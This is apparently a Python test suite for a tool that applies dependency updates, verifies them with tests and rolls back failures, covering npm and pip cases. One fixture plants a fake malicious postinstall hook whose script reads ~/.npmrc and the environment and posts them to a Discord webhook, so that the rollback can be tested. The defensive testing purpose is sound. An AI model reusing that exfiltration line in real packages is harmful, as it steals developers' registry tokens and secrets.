import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from scs import executor

# Stub npm: `npm update qs` bumps qs in the lockfile and node_modules (optionally planting a
# malicious postinstall); `npm run test` fails when BREAK exists and qs was updated, or when ALWAYS_FAIL exists.
NPM_STUB = r"""#!/bin/sh
case "$1" in
  update)
    [ -f FAIL_APPLY ] && { echo "npm ERR! network"; exit 1; }
    sed -i.bak 's/"6.5.2"/"6.5.3"/' package-lock.json && rm -f package-lock.json.bak
    printf '{"name":"qs","version":"6.5.3"}' > node_modules/qs/package.json
    if [ -f PLANT_MALWARE ]; then
      printf '{"name":"qs","version":"6.5.3","scripts":{"postinstall":"node p.js"}}' > node_modules/qs/package.json
      printf "require('https').request('https://discord.com/api/webhooks/1/x').end(require('fs').readFileSync(process.env.HOME+'/.npmrc')+JSON.stringify(process.env))" > node_modules/qs/p.js
    fi ;;
  run)
    [ -f ALWAYS_FAIL ] && { echo "tests fail"; exit 1; }
    if [ -f BREAK ] && grep -q 6.5.3 package-lock.json; then echo "TypeError: qs.parse is not a function"; exit 1; fi
    echo ok ;;
esac
"""


def make_project(root: Path) -> Path:
    d = root / "app"
    (d / "node_modules" / "qs").mkdir(parents=True)
    (d / "package.json").write_text(json.dumps({"dependencies": {"qs": "^6.5.0"}, "scripts": {"test": "x"}}))
    (d / "package-lock.json").write_text(json.dumps({"lockfileVersion": 3, "packages": {
        "": {"dependencies": {"qs": "^6.5.0"}}, "node_modules/qs": {"version": "6.5.2"}}}, indent=1))
    (d / "node_modules" / "qs" / "package.json").write_text('{"name":"qs","version":"6.5.2"}')
    return d


def project_plan(d: Path, change: list[str] | None = None, warnings: list[str] | None = None) -> dict:
    return {"targets": [{
        "kind": "project", "id": str(d), "title": f"Project {d}", "warnings": warnings or [],
        "packages": [{"name": "qs", "from": "6.5.2", "to": "6.5.3", "action": "patch", "direct": True,
                      "ecosystem": "npm", "location": str(d / "package-lock.json"), "lockfile": "package-lock.json",
                      "top": None}],
        "backup": [], "change": change or [f"cd '{d}' && npm update qs"],
        "verify": [f"cd '{d}' && npm run test"], "rollback": [], "manual": [], "meta": {}}]}


POSIX_ONLY = unittest.skipIf(os.name == "nt", "uses bash stub tools; Windows execution is covered by test_windows")


@POSIX_ONLY
class ExecutorTests(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        bindir = self.tmp / "bin"
        bindir.mkdir()
        (bindir / "npm").write_text(NPM_STUB)
        (bindir / "npm").chmod(0o755)
        self.env = mock.patch.dict(os.environ, {"PATH": f"{bindir}:{os.environ['PATH']}",
                                                "XDG_DATA_HOME": str(self.tmp / "data")})
        self.env.start()
        self.addCleanup(self.env.stop)
        self.d = make_project(self.tmp)
        self.out: list[str] = []

    def run_plan(self, plan: dict, **kw) -> dict:
        opts = executor.Options(yes=True, out=self.out.append, **kw)
        return executor.Runner(plan, "test-plan.json", opts).execute([1])["targets"][0]

    def lock_version(self) -> str:
        return json.loads((self.d / "package-lock.json").read_text())["packages"]["node_modules/qs"]["version"]

    def test_applied(self):
        rec = self.run_plan(project_plan(self.d))
        self.assertEqual(rec["status"], "applied", self.out)
        self.assertEqual(self.lock_version(), "6.5.3")
        phases = [s["phase"] for s in rec["steps"]]
        self.assertEqual(phases[:2], ["preflight", "baseline"])
        self.assertIn("postcheck", phases)

    def test_regression_rolls_back_exactly(self):
        (self.d / "BREAK").touch()
        rec = self.run_plan(project_plan(self.d))
        self.assertEqual(rec["status"], "rolled_back", self.out)
        self.assertEqual(self.lock_version(), "6.5.2")
        self.assertEqual(json.loads((self.d / "node_modules/qs/package.json").read_text())["version"], "6.5.2")
        backups = list((self.tmp / "data" / "scs" / "runs").glob("*/backups/t1/failed-state/package-lock.json"))
        self.assertEqual(len(backups), 1)  # failed state kept, not deleted
        self.assertIn("6.5.3", backups[0].read_text())

    def test_already_failing_tests_do_not_trigger_rollback(self):
        (self.d / "ALWAYS_FAIL").touch()
        rec = self.run_plan(project_plan(self.d))
        self.assertEqual(rec["status"], "applied", self.out)
        self.assertTrue(any("already failing" in o for o in self.out))

    def test_failed_apply_command_rolls_back(self):
        (self.d / "FAIL_APPLY").touch()
        rec = self.run_plan(project_plan(self.d))
        self.assertEqual(rec["status"], "rolled_back")
        self.assertIn("apply command failed", rec["reason"])

    def test_post_update_malware_rolls_back(self):
        (self.d / "PLANT_MALWARE").touch()
        rec = self.run_plan(project_plan(self.d))
        self.assertEqual(rec["status"], "rolled_back", self.out)
        self.assertFalse((self.d / "node_modules" / "qs" / "p.js").exists())

    def test_preflight_refusals(self):
        (self.d / "package-lock.json").write_text((self.d / "package-lock.json").read_text().replace("6.5.2", "6.5.3"))
        self.assertEqual(self.run_plan(project_plan(self.d))["status"], "skipped")  # already changed
        d2 = make_project(self.tmp / "two")
        self.assertEqual(self.run_plan(project_plan(d2, change=[f"cd '{d2}' && sudo npm update qs"]))["status"], "skipped")
        self.assertEqual(self.run_plan(project_plan(d2, change=[f"cd '{d2}' && nosuchtool x"]))["status"], "skipped")
        # risky target with --yes but without --accept-risk is not applied
        self.assertEqual(self.run_plan(project_plan(d2, warnings=["needs go >=1.26"]))["status"], "skipped")
        self.assertEqual(self.run_plan(project_plan(d2, warnings=["w"]), accept_risk=True)["status"], "applied")

    def test_dry_run_changes_nothing(self):
        rec = self.run_plan(project_plan(self.d), dry_run=True)
        self.assertEqual(rec["status"], "dry-run")
        self.assertEqual(self.lock_version(), "6.5.2")

    def test_interactive_skip(self):
        opts = executor.Options(out=self.out.append, ask=lambda _: "n")
        rec = executor.Runner(project_plan(self.d), "p", opts).execute([1])["targets"][0]
        self.assertEqual(rec["status"], "skipped")


@POSIX_ONLY
class PipSnapshotTests(unittest.TestCase):
    def test_pip_target_rollback_restores_site_packages(self):
        tmp = Path(tempfile.mkdtemp())
        with mock.patch.dict(os.environ, {"XDG_DATA_HOME": str(tmp / "data")}):
            site = tmp / "env" / "lib" / "python3.11" / "site-packages"
            (site / "fakepkg").mkdir(parents=True)
            (site / "fakepkg" / "__init__.py").write_text("def ok():\n    return True\n")
            (site / "fakepkg-1.0.dist-info").mkdir()
            (site / "fakepkg-1.0.dist-info" / "METADATA").write_text("Name: fakepkg\nVersion: 1.0\n\n")
            (tmp / "env" / "bin").mkdir()
            upgrade = (f"cd '{site}' && mv fakepkg-1.0.dist-info fakepkg-2.0.dist-info && "
                       "printf 'Name: fakepkg\\nVersion: 2.0\\n\\n' > fakepkg-2.0.dist-info/METADATA && "
                       "printf 'def ok():\\n    return False\\n' > fakepkg/__init__.py")
            check = f"PYTHONPATH='{site}' python3 -c 'import fakepkg, sys; sys.exit(0 if fakepkg.ok() else 1)'"
            plan = {"targets": [{
                "kind": "pip", "id": str(tmp / "env"), "title": "env", "warnings": [],
                "packages": [{"name": "fakepkg", "from": "1.0", "to": "2.0", "action": "patch", "direct": True,
                              "ecosystem": "PyPI", "location": str(site), "lockfile": None, "top": None}],
                "backup": [], "change": [upgrade], "verify": [check], "rollback": [], "manual": [],
                "meta": {"site": str(site), "python": "python3", "root": None}}]}
            out: list[str] = []
            rec = executor.Runner(plan, "p", executor.Options(yes=True, out=out.append)).execute([1])["targets"][0]
            self.assertEqual(rec["status"], "rolled_back", out)
            self.assertTrue((site / "fakepkg-1.0.dist-info").is_dir())
            self.assertFalse((site / "fakepkg-2.0.dist-info").exists())
            self.assertIn("True", (site / "fakepkg" / "__init__.py").read_text())


class HelperTests(unittest.TestCase):
    def test_segments_and_sudo(self):
        self.assertTrue(executor.uses_sudo(["cd /x && sudo rm -rf y"]))
        self.assertFalse(executor.uses_sudo(["echo sudo"]))
        self.assertEqual(executor.missing_tools(["cd /x && definitely-not-a-tool --v"]), ["definitely-not-a-tool"])


if __name__ == "__main__":
    unittest.main()


class FixSafeRegressionTests(unittest.TestCase):
    def test_error_line_from_pip_log(self):
        log = Path(tempfile.mkdtemp()) / "x.log"
        log.write_text("$ pip install\n\nCollecting certifi\nERROR: Could not find a version that satisfies urllib3>=2.8.0\n"
                       "ERROR: No matching distribution found for urllib3>=2.8.0\n")
        self.assertEqual(executor._error_line(str(log)), "ERROR: No matching distribution found for urllib3>=2.8.0")

    def test_macos_user_site_runtime_detected(self):
        from scs.collectors.python import scan_site
        site = Path(tempfile.mkdtemp()) / "Library" / "Python" / "3.9" / "lib" / "python" / "site-packages"
        (site / "urllib3-2.6.3.dist-info").mkdir(parents=True)
        (site / "urllib3-2.6.3.dist-info" / "METADATA").write_text("Name: urllib3\nVersion: 2.6.3\n\n")
        self.assertEqual(scan_site(site, "global")[0].meta["runtime"], "3.9")

    @POSIX_ONLY
    def test_keep_going_after_a_failed_group(self):
        tmp = Path(tempfile.mkdtemp())
        with mock.patch.dict(os.environ, {"XDG_DATA_HOME": str(tmp / "data")}):
            d1, d2 = make_project(tmp / "one"), make_project(tmp / "two")
            p1, p2 = project_plan(d1, change=[f"cd '{d1}' && false"]), project_plan(d2, change=[f"cd '{d2}' && true"])
            plan = {"targets": p1["targets"] + p2["targets"]}
            with mock.patch.object(executor, "missing_tools", return_value=[]), \
                    mock.patch.object(executor, "still_vulnerable", return_value=[]):
                stop = executor.Runner(plan, "p", executor.Options(yes=True, out=lambda _: None)).execute([1, 2])
                go = executor.Runner(plan, "p", executor.Options(yes=True, keep_going=True, out=lambda _: None)).execute([1, 2])
        self.assertEqual([t["status"] for t in stop["targets"]], ["rolled_back"])           # CLI default: stop
        self.assertEqual([t["status"] for t in go["targets"]], ["rolled_back", "applied"])  # GUI: independent groups


@POSIX_ONLY
class NetworkRetryTests(unittest.TestCase):
    def test_network_failure_is_retried_once(self):
        tmp = Path(tempfile.mkdtemp())
        d = make_project(tmp)
        flag = tmp / "failed-once"
        # first attempt: DNS failure like npm prints it; second attempt: succeeds
        cmd = (f"if [ ! -f '{flag}' ]; then touch '{flag}'; echo 'npm error network request to https://registry.npmjs.org/x "
               f"failed, reason: getaddrinfo ENOTFOUND registry.npmjs.org'; exit 1; fi; "
               f"cd '{d}' && sed -i.bak 's/6.5.2/6.5.3/' package-lock.json")
        with mock.patch.dict(os.environ, {"XDG_DATA_HOME": str(tmp / "data")}), \
                mock.patch.object(executor, "NETWORK_RETRY_DELAY", 0), mock.patch.object(executor, "missing_tools", return_value=[]):
            rec = executor.Runner(project_plan(d, change=[cmd]), "p", executor.Options(yes=True, out=lambda _: None)).execute([1])["targets"][0]
        self.assertEqual(rec["status"], "applied")
        self.assertTrue(any(s.get("retry") for s in rec["steps"]))

    def test_persistent_network_failure_has_plain_reason(self):
        tmp = Path(tempfile.mkdtemp())
        d = make_project(tmp)
        cmd = "echo 'curl: (6) Could not resolve host: pypi.org'; exit 1"
        with mock.patch.dict(os.environ, {"XDG_DATA_HOME": str(tmp / "data")}), \
                mock.patch.object(executor, "NETWORK_RETRY_DELAY", 0), mock.patch.object(executor, "missing_tools", return_value=[]):
            rec = executor.Runner(project_plan(d, change=[cmd]), "p", executor.Options(yes=True, out=lambda _: None)).execute([1])["targets"][0]
        self.assertEqual(rec["status"], "rolled_back")
        self.assertTrue(rec["reason"].startswith("network problem: could not reach pypi.org"), rec["reason"])
